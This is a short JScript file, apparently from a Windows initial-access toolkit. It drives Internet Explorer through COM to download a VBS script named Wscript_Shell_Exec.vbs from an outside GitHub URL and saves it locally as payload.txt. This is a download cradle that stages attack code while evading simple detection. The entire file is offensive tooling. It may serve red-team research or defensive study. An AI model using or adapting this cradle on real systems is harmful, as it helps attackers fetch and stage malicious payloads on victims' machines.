var ie = new ActiveXObject("InternetExplorer.Application")
ie.Navigate("https://raw.githubusercontent.com/hegusung/Windows-Initial-Access/main/VBS/Wscript_Shell_Exec.vbs")
var state = 0
while (state != 4)
{
	WScript.Sleep(1000);
	state = ie.readyState
}

var objFSO = new ActiveXObject("Scripting.FileSystemObject")
var objFile = objFSO.CreateTextFile(".\\payload.txt", true)
objFile.Write(ie.document.body.innerHTML)
objFile.Close()